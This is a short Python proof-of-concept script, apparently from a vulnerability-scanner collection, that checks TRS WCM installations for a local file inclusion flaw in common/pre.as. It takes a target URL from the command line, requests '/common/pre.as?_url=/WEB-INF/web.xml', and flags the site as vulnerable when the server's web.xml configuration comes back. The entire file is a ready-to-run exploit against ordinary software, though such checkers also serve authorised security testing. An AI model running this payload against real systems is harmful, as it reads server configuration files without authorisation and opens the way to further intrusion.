#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm pre.as 文件包含
referer: http://www.wooyun.org/bugs/wooyun-2015-0120447
author: Lucifer
description: 文件common/pre.as中,参数_url未过滤存在文件包含漏洞。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_wcm_pre_as_lfi_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/common/pre.as?_url=/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<web-app" in req.text:
                cprint("[+]存在拓尔思wcm pre.as 文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_wcm_pre_as_lfi_BaseVerify(sys.argv[1])
    testVuln.run()
